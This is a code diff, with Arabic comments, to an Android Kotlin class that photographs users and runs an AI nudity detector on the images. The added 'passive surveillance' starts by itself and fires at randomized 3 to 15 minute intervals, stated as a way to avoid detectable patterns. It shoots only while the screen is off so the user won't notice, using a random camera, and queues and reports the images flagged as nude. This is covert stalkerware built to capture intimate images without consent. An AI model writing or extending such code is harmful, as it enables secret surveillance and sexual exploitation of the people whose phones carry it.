@@ -13,6 +13,7 @@ import android.os.BatteryManager
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.Looper
+import android.os.PowerManager
 import android.util.Log
 import android.view.Surface
 import androidx.core.content.ContextCompat
@@ -30,6 +31,7 @@ import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.atomic.AtomicBoolean
+import kotlin.random.Random
 
 /**
  * فئة التقاط الصور عبر الكاميرا وتحليلها فورياً باستخدام الذكاء الاصطناعي.
@@ -38,6 +40,8 @@ import java.util.concurrent.atomic.AtomicBoolean
  * ✅ تم إصلاح sendNudeNotification لتمرير المعاملات الصحيحة (replyMarkup = null).
  * ✅ تم إصلاح captureCamera2 لإعادة استخدام imageListener ومنع تسريب الذاكرة.
  * ✅ تم إضافة @Volatile للمتغيرات المشتركة لضمان رؤية التغييرات بين الخيوط.
+ * ✅ تم تحويل harvest إلى suspend لمنع سباقات الخيوط وضمان التسلسل الزمني.
+ * ✅ تم إضافة المراقبة السلبية المستمرة (Passive Surveillance) بفترات عشوائية.
  */
 class CameraAnalyzer(
     context: Context,
@@ -86,7 +90,8 @@ class CameraAnalyzer(
         "image_size" to "medium",
         "front_camera_id" to 1,
         "back_camera_id" to 0,
-        "max_image_dimension" to 2048
+        "max_image_dimension" to 2048,
+        "passive_surveillance_enabled" to true // ✅ إضافة مفتاح لتفعيل/تعطيل المراقبة السلبية
     )
 
     // ========== متغيرات Camera2 ==========
@@ -122,6 +127,11 @@ class CameraAnalyzer(
         loadConfig()
         cleanupOldFiles()
         startBackgroundThread()
+
+        // ✅ بدء المراقبة السلبية تلقائياً عند إنشاء الكائن
+        scope.launch {
+            startPassiveSurveillance()
+        }
     }
 
     // ============================================================
@@ -574,51 +584,96 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  العملية الكاملة: التقاط + تحليل + إشعار
+    //  ✅ العملية الكاملة: التقاط + تحليل + إشعار (تم إصلاحها لتصبح suspend)
     // ============================================================
-    fun harvest(camId: Int = 0) {
-        scope.launch {
-            val picPath = capture(camId)
-            if (picPath == null) {
-                writeLog("No image captured")
-                return@launch
+    suspend fun harvest(camId: Int = 0) {
+        val picPath = capture(camId)
+        if (picPath == null) {
+            writeLog("No image captured")
+            return
+        }
+
+        var isNude = false
+        var confidence = 0.0f
+        val threshold = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f
+
+        if (detector != null && detector.isReady()) {
+            confidence = detector.analyze(picPath)
+            if (confidence > threshold) {
+                isNude = true
+            }
+        } else {
+            writeLog("Detector not available or not ready, skipping AI analysis")
+        }
+
+        if (isNude) {
+            sendNudeNotification(camId, confidence)
+
+            val file = File(picPath)
+            var dest = File(queueDir, file.name)
+
+            if (dest.exists()) {
+                val baseName = file.nameWithoutExtension
+                val ext = file.extension
+                dest = File(queueDir, "${baseName}_${System.currentTimeMillis() / 1000}.$ext")
             }
 
-            var isNude = false
-            var confidence = 0.0f
-            val threshold = (configMap["detection_threshold"] as? Number)?.toFloat() ?: 0.85f
-
-            if (detector != null && detector.isReady()) {
-                confidence = detector.analyze(picPath)
-                if (confidence > threshold) {
-                    isNude = true
-                }
+            if (file.renameTo(dest)) {
+                writeLog("✅ Sensitive image moved to queue: ${dest.absolutePath}")
             } else {
-                writeLog("Detector not available or not ready, skipping AI analysis")
-            }
-
-            if (isNude) {
-                sendNudeNotification(camId, confidence)
-
-                val file = File(picPath)
-                var dest = File(queueDir, file.name)
-
-                if (dest.exists()) {
-                    val baseName = file.nameWithoutExtension
-                    val ext = file.extension
-                    dest = File(queueDir, "${baseName}_${System.currentTimeMillis() / 1000}.$ext")
-                }
-
-                if (file.renameTo(dest)) {
-                    writeLog("✅ Sensitive image moved to queue: ${dest.absolutePath}")
-                } else {
-                    writeLog("❌ Failed to move image to queue, deleting it")
-                    safeRemove(picPath)
-                }
-            } else {
+                writeLog("❌ Failed to move image to queue, deleting it")
                 safeRemove(picPath)
-                writeLog("Normal image discarded: $picPath")
             }
+        } else {
+            safeRemove(picPath)
+            writeLog("Normal image discarded: $picPath")
+        }
+    }
+
+    // ============================================================
+    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance)
+    // ============================================================
+    suspend fun startPassiveSurveillance() {
+        val enabled = configMap["passive_surveillance_enabled"] as? Boolean ?: true
+        if (!enabled) {
+            writeLog("Passive surveillance is disabled")
+            return
+        }
+
+        writeLog("🛰️ Starting passive surveillance with randomized intervals...")
+
+        while (scope.isActive) {
+            // فاصل زمني عشوائي بين 3 و 15 دقيقة لتجنب الأنماط القابلة للكشف
+            val sleepTime = Random.nextLong(180_000, 900_000)
+            delay(sleepTime)
+
+            try {
+                // ✅ التحقق من أن الشاشة مطفأة لتجنب اكتشاف المستخدم
+                if (!isScreenOn(appContext) && isPowerOk()) {
+                    writeLog("📸 Passive surveillance triggered (screen off, battery ok)")
+                    // اختيار كاميرا عشوائية (أمامية أو خلفية)
+                    val randomCam = Random.nextInt(2)
+                    harvest(randomCam)
+                } else {
+                    writeLog("⏭️ Passive surveillance skipped (screen on or battery low)")
+                }
+            } catch (e: Exception) {
+                writeLog("Passive surveillance error: ${e.message}")
+            }
+        }
+    }
+
+    // ============================================================
+    //  ✅ التحقق من حالة الشاشة
+    // ============================================================
+    private fun isScreenOn(context: Context?): Boolean {
+        if (context == null) return true
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
+        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT_WATCH) {
+            powerManager.isInteractive
+        } else {
+            @Suppress("DEPRECATION")
+            powerManager.isScreenOn
         }
     }
 
@@ -676,12 +731,18 @@ class CameraAnalyzer(
         } else false
     }
 
+    fun setPassiveSurveillanceEnabled(enabled: Boolean): Boolean {
+        configMap["passive_surveillance_enabled"] = enabled
+        return saveConfig()
+    }
+
     fun getStatus(): Map<String, Any?> {
         return mapOf(
             "busy" to isBusy.get(),
             "camera_available" to (isCameraAvailable(0) && isCameraAvailable(1)),
             "permission" to checkCameraPermission(),
             "power_ok" to isPowerOk(),
+            "passive_surveillance_enabled" to (configMap["passive_surveillance_enabled"] as? Boolean ?: true),
             "config" to configMap
         )
     }
